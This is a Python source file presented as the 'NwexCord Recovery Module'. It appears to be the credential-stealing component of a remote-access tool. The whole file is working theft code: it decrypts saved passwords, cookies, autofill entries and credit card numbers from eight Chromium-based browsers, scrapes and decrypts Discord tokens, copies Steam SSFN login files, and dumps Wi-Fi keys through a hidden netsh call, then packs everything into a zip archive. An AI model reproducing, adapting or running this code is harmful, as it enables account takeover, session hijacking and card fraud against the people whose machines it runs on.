"""
NwexCord Recovery Module
Extracts browser passwords, cookies, autofill data, Steam/Discord tokens,
and Wi-Fi keys.  Results are organised into per-browser / per-profile
folders and compressed into a single .zip archive.

Folder layout produced by "Run Recovery":
    Passwords_MM-DD-YYYY HH-MM-SS-fff/
        chrome/
            default/
                passwords.txt
                cookies.txt
                auto_fills.txt
            Profile 1/
                ...
        edge/
            default/
                ...
        steam/
            tokens.txt
        discord/
            tokens.txt
        wifi/
            keys.txt
"""

import os
import sys
import json
import shutil
import sqlite3
import base64
import tempfile
import subprocess
import re
import zipfile
from datetime import datetime

# ---------------------------------------------------------------------------
# Constants – browser name -> user-data directory
# ---------------------------------------------------------------------------
_LOCAL = os.environ.get("LOCALAPPDATA", "")
_ROAMING = os.environ.get("APPDATA", "")

_BROWSERS: list[tuple[str, str]] = [
    ("chrome",      os.path.join(_LOCAL,   "Google", "Chrome", "User Data")),
    ("edge",        os.path.join(_LOCAL,   "Microsoft", "Edge", "User Data")),
    ("brave",       os.path.join(_LOCAL,   "BraveSoftware", "Brave-Browser", "User Data")),
    ("opera",       os.path.join(_ROAMING, "Opera Software", "Opera Stable")),
    ("opera_gx",    os.path.join(_ROAMING, "Opera Software", "Opera GX Stable")),
    ("vivaldi",     os.path.join(_LOCAL,   "Vivaldi", "User Data")),
    ("chromium",    os.path.join(_LOCAL,   "Chromium", "User Data")),
    ("yandex",      os.path.join(_LOCAL,   "Yandex", "YandexBrowser", "User Data")),
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _safe_copy_db(src: str) -> str | None:
    """Copy a locked SQLite DB to a temp file so we can query it."""
    if not os.path.isfile(src):
        return None
    tmp = tempfile.mktemp(suffix=".db")
    try:
        shutil.copy2(src, tmp)
        return tmp
    except Exception:
        return None


def _dpapi_decrypt(data: bytes) -> bytes:
    """Decrypt bytes using Windows DPAPI (CryptUnprotectData)."""
    import ctypes
    import ctypes.wintypes

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.wintypes.DWORD),
                     ("pbData", ctypes.POINTER(ctypes.c_char))]

    blob_in = DATA_BLOB(len(data), ctypes.create_string_buffer(data, len(data)))
    blob_out = DATA_BLOB()
    if ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0,
            ctypes.byref(blob_out)):
        result = ctypes.string_at(blob_out.pbData, blob_out.cbData)
        ctypes.windll.kernel32.LocalFree(blob_out.pbData)
        return result
    return b""


def _get_master_key(local_state_path: str) -> bytes | None:
    """Read the AES master key from Chromium Local State file."""
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            data = json.load(f)
        encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # strip DPAPI prefix
        return _dpapi_decrypt(encrypted_key)
    except Exception:
        return None


def _decrypt_value(encrypted: bytes, key: bytes | None) -> str:
    """Decrypt a Chromium encrypted value (v10/v11 AES-GCM or DPAPI)."""
    if not encrypted:
        return ""
    # AES-GCM (Chromium ≥ v80)
    if key and encrypted[:3] in (b"v10", b"v11"):
        try:
            from Crypto.Cipher import AES
            nonce      = encrypted[3:15]
            ciphertext = encrypted[15:-16]
            tag        = encrypted[-16:]
            cipher     = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag).decode("utf-8", errors="replace")
        except Exception:
            pass
    # DPAPI fallback
    try:
        return _dpapi_decrypt(encrypted).decode("utf-8", errors="replace")
    except Exception:
        return ""


def _browser_profiles(user_data: str) -> list[str]:
    """Return profile sub-folder names inside a Chromium User Data dir."""
    if not os.path.isdir(user_data):
        return []
    profiles = []
    for name in os.listdir(user_data):
        full = os.path.join(user_data, name)
        if os.path.isdir(full) and (name == "Default" or name.startswith("Profile ")):
            profiles.append(name)
    if not profiles:
        # Opera stores data at root level
        profiles = [""]
    return profiles


# ---------------------------------------------------------------------------
# Per-profile extraction helpers
# ---------------------------------------------------------------------------

def _extract_passwords(profile_dir: str, key: bytes | None) -> str:
    """Extract passwords from Login Data in *profile_dir*."""
    db = _safe_copy_db(os.path.join(profile_dir, "Login Data"))
    if not db:
        return ""
    lines: list[str] = []
    try:
        conn = sqlite3.connect(db)
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, enc_pw in cur.fetchall():
            if not url and not user:
                continue
            pw = _decrypt_value(enc_pw, key) if enc_pw else ""
            lines.append(f"URL: {url}")
            lines.append(f"Username: {user}")
            lines.append(f"Password: {pw}")
            lines.append("")
        conn.close()
    except Exception:
        pass
    finally:
        try: os.remove(db)
        except: pass
    return "\n".join(lines)


def _extract_cookies(profile_dir: str, key: bytes | None) -> str:
    """Extract cookies from Cookies / Network\\Cookies in *profile_dir*."""
    lines: list[str] = []
    for cookie_rel in ("Network\\Cookies", "Cookies"):
        db = _safe_copy_db(os.path.join(profile_dir, cookie_rel))
        if not db:
            continue
        try:
            conn = sqlite3.connect(db)
            cur = conn.cursor()
            cur.execute(
                "SELECT host_key, name, encrypted_value, path, "
                "expires_utc, is_secure, is_httponly FROM cookies"
            )
            for host, name, enc_val, path, expires, secure, httponly in cur.fetchall():
                value = _decrypt_value(enc_val, key) if enc_val else ""
                sec = "TRUE" if secure else "FALSE"
                http = "TRUE" if httponly else "FALSE"
                # Netscape cookie-jar format (same as the DLL output)
                lines.append(
                    f"{host}\t{http}\t{path}\t{sec}\t{expires}\t{name}"
                )
                lines.append(f"\t{value}")
            conn.close()
        except Exception:
            pass
        finally:
            try: os.remove(db)
            except: pass
        break  # first match is enough
    return "\n".join(lines)


def _extract_autofill(profile_dir: str) -> str:
    """Extract autofill (form) data from Web Data in *profile_dir*."""
    db = _safe_copy_db(os.path.join(profile_dir, "Web Data"))
    if not db:
        return ""
    lines: list[str] = []
    try:
        conn = sqlite3.connect(db)
        cur = conn.cursor()
        cur.execute("SELECT name, value FROM autofill")
        for field, value in cur.fetchall():
            if not field:
                continue
            lines.append(f"Field: {field}")
            lines.append(f"Value: {value}")
            lines.append("")
        conn.close()
    except Exception:
        pass
    finally:
        try: os.remove(db)
        except: pass
    return "\n".join(lines)


def _extract_credit_cards(profile_dir: str, key: bytes | None) -> str:
    """Extract saved credit cards from Web Data in *profile_dir*."""
    db = _safe_copy_db(os.path.join(profile_dir, "Web Data"))
    if not db:
        return ""
    lines: list[str] = []
    try:
        conn = sqlite3.connect(db)
        cur = conn.cursor()
        cur.execute(
            "SELECT name_on_card, expiration_month, expiration_year, "
            "card_number_encrypted FROM credit_cards"
        )
        for name, month, year, enc_num in cur.fetchall():
            number = _decrypt_value(enc_num, key) if enc_num else ""
            lines.append(f"Name: {name}")
            lines.append(f"Number: {number}")
            lines.append(f"Expiry: {month}/{year}")
            lines.append("")
        conn.close()
    except Exception:
        pass
    finally:
        try: os.remove(db)
        except: pass
    return "\n".join(lines)


# ---------------------------------------------------------------------------
# High-level grabbers (write into *out_dir*)
# ---------------------------------------------------------------------------

def grab_browser_data(out_dir: str, *, passwords=True, cookies=True,
                      autofill=True, credit_cards=True) -> None:
    """Extract data from every installed Chromium-based browser."""
    for browser_name, user_data in _BROWSERS:
        if not os.path.isdir(user_data):
            continue
        key = _get_master_key(os.path.join(user_data, "Local State"))
        for profile in _browser_profiles(user_data):
            profile_dir = os.path.join(user_data, profile)
            folder_name = profile.lower().replace(" ", "_") if profile else "default"
            dest = os.path.join(out_dir, browser_name, folder_name)
            os.makedirs(dest, exist_ok=True)

            if passwords:
                data = _extract_passwords(profile_dir, key)
                if data.strip():
                    with open(os.path.join(dest, "passwords.txt"), "w", encoding="utf-8") as f:
                        f.write(data)

            if cookies:
                data = _extract_cookies(profile_dir, key)
                if data.strip():
                    with open(os.path.join(dest, "cookies.txt"), "w", encoding="utf-8") as f:
                        f.write(data)

            if autofill:
                data = _extract_autofill(profile_dir)
                if data.strip():
                    with open(os.path.join(dest, "auto_fills.txt"), "w", encoding="utf-8") as f:
                        f.write(data)

            if credit_cards:
                data = _extract_credit_cards(profile_dir, key)
                if data.strip():
                    with open(os.path.join(dest, "credit_cards.txt"), "w", encoding="utf-8") as f:
                        f.write(data)


# ---------------------------------------------------------------------------
# Discord Tokens
# ---------------------------------------------------------------------------

def grab_discord_tokens(out_dir: str | None = None) -> str:
    """Scan known Discord storage locations for tokens."""
    tokens: list[str] = []
    paths = [
        os.path.join(_ROAMING, "discord",        "Local Storage", "leveldb"),
        os.path.join(_ROAMING, "discordcanary",  "Local Storage", "leveldb"),
        os.path.join(_ROAMING, "discordptb",     "Local Storage", "leveldb"),
    ]
    # Also check browser leveldb
    for _, user_data in _BROWSERS:
        for profile in _browser_profiles(user_data):
            paths.append(os.path.join(user_data, profile, "Local Storage", "leveldb"))

    token_re     = re.compile(r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}')
    mfa_re       = re.compile(r'mfa\.[\w-]{80,}')
    encrypted_re = re.compile(r'dQw4w9WgXcQ:[^\"]*')

    for path in paths:
        if not os.path.isdir(path):
            continue
        for fn in os.listdir(path):
            if not fn.endswith((".log", ".ldb")):
                continue
            try:
                with open(os.path.join(path, fn), "r", errors="ignore") as f:
                    content = f.read()
                for m in token_re.findall(content):
                    if m not in tokens:
                        tokens.append(m)
                for m in mfa_re.findall(content):
                    if m not in tokens:
                        tokens.append(m)
                for m in encrypted_re.findall(content):
                    try:
                        ls = os.path.join(_ROAMING, "discord", "Local State")
                        key = _get_master_key(ls)
                        if key:
                            enc = base64.b64decode(m.split("dQw4w9WgXcQ:")[1])
                            dec = _decrypt_value(enc, key)
                            if dec and dec not in tokens:
                                tokens.append(dec)
                    except Exception:
                        pass
            except Exception:
                continue

    text = "\n".join(tokens) if tokens else "No Discord tokens found."
    if out_dir:
        dest = os.path.join(out_dir, "discord")
        os.makedirs(dest, exist_ok=True)
        with open(os.path.join(dest, "tokens.txt"), "w", encoding="utf-8") as f:
            f.write(text)
    return text


# ---------------------------------------------------------------------------
# Steam Tokens (SSFN only)
# ---------------------------------------------------------------------------

def grab_steam_tokens(out_dir: str | None = None) -> str:
    """Grab SSFN auth-token files (machine-auth for Steam login)."""
    steam_path = None
    for c in [
        os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam"),
        os.path.join(os.environ.get("PROGRAMFILES", ""), "Steam"),
        os.path.join("C:\\", "Steam"),
    ]:
        if os.path.isdir(c):
            steam_path = c
            break

    if not steam_path:
        text = "Steam installation not found."
        if out_dir:
            dest = os.path.join(out_dir, "steam")
            os.makedirs(dest, exist_ok=True)
            with open(os.path.join(dest, "tokens.txt"), "w", encoding="utf-8") as f:
                f.write(text)
        return text

    ssfn_files = [f for f in os.listdir(steam_path) if f.startswith("ssfn")]
    if not ssfn_files:
        text = "No Steam SSFN token files found."
        if out_dir:
            dest = os.path.join(out_dir, "steam")
            os.makedirs(dest, exist_ok=True)
            with open(os.path.join(dest, "tokens.txt"), "w", encoding="utf-8") as f:
                f.write(text)
        return text

    lines = ["=== Steam SSFN Tokens ===", ""]
    for sf in ssfn_files:
        fp = os.path.join(steam_path, sf)
        try:
            with open(fp, "rb") as f:
                raw = f.read()
            lines.append(f"File : {sf}")
            lines.append(f"Size : {len(raw)} bytes")
            lines.append(f"Token: {base64.b64encode(raw).decode('ascii')}")
            lines.append("")
        except Exception as e:
            lines.append(f"File : {sf}  (error: {e})")
            lines.append("")

    text = "\n".join(lines)
    if out_dir:
        dest = os.path.join(out_dir, "steam")
        os.makedirs(dest, exist_ok=True)
        with open(os.path.join(dest, "tokens.txt"), "w", encoding="utf-8") as f:
            f.write(text)
    return text


# ---------------------------------------------------------------------------
# Wi-Fi Keys
# ---------------------------------------------------------------------------

def grab_wifi_keys(out_dir: str | None = None) -> str:
    """Retrieve saved Wi-Fi passwords via netsh."""
    lines: list[str] = []
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "profiles"],
            capture_output=True, text=True,
            creationflags=0x08000000
        )
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", result.stdout)
        if not profiles:
            profiles = re.findall(r"Tüm Kullanıcı Profili\s*:\s*(.*)", result.stdout)
        if not profiles:
            profiles = re.findall(r":\s+(.+)", result.stdout)

        for profile in profiles:
            profile = profile.strip()
            if not profile:
                continue
            kr = subprocess.run(
                ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                capture_output=True, text=True,
                creationflags=0x08000000
            )
            password = ""
            for pat in (r"Key Content\s*:\s*(.*)",
                        r"Anahtar İçeriği\s*:\s*(.*)",
                        r"Contenu de la clé\s*:\s*(.*)"):
                pw_m = re.search(pat, kr.stdout)
                if pw_m:
                    password = pw_m.group(1).strip()
                    break
            lines.append(f"SSID     : {profile}")
            lines.append(f"Password : {password if password else '(none)'}")
            lines.append("")
    except Exception as e:
        lines.append(f"Error: {e}")

    text = "\n".join(lines) if lines else "No Wi-Fi profiles found."
    if out_dir:
        dest = os.path.join(out_dir, "wifi")
        os.makedirs(dest, exist_ok=True)
        with open(os.path.join(dest, "keys.txt"), "w", encoding="utf-8") as f:
            f.write(text)
    return text


# ---------------------------------------------------------------------------
# Build ZIP archive
# ---------------------------------------------------------------------------

def build_recovery_zip(tasks: list[str] | None = None) -> str:
    """
    Run selected recovery tasks, organise output into folders,
    and compress everything into a single .zip.

    Valid task keys:
        "all"      – everything
        "steam"    – Steam SSFN tokens only
        "discord"  – Discord tokens only
        "chromium" – Chromium login data only
        "cookies"  – All browser cookies only
        "wifi"     – Wi-Fi keys only

    Returns the path to the .zip file.
    """
    if tasks is None:
        tasks = ["all"]

    timestamp = datetime.now().strftime("%m-%d-%Y %H-%M-%S-%f")[:-3]
    folder_name = f"Passwords_{timestamp}"
    tmp_dir = os.path.join(tempfile.gettempdir(), folder_name)
    os.makedirs(tmp_dir, exist_ok=True)

    run_all = "all" in tasks

    # Browser data (passwords + cookies + autofill + credit cards)
    if run_all:
        grab_browser_data(tmp_dir, passwords=True, cookies=True,
                          autofill=True, credit_cards=True)
    elif "chromium" in tasks:
        grab_browser_data(tmp_dir, passwords=True, cookies=False,
                          autofill=True, credit_cards=True)
    elif "cookies" in tasks:
        grab_browser_data(tmp_dir, passwords=False, cookies=True,
                          autofill=False, credit_cards=False)

    # Individual tasks
    if run_all or "steam" in tasks:
        grab_steam_tokens(tmp_dir)
    if run_all or "discord" in tasks:
        grab_discord_tokens(tmp_dir)
    if run_all or "wifi" in tasks:
        grab_wifi_keys(tmp_dir)

    # Pack into zip
    zip_path = os.path.join(tempfile.gettempdir(), f"{folder_name}.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(tmp_dir):
            for fn in files:
                abs_path = os.path.join(root, fn)
                arc_name = os.path.relpath(abs_path, tmp_dir)
                zf.write(abs_path, arc_name)

    # Cleanup temp folder
    try:
        shutil.rmtree(tmp_dir)
    except Exception:
        pass

    return zip_path
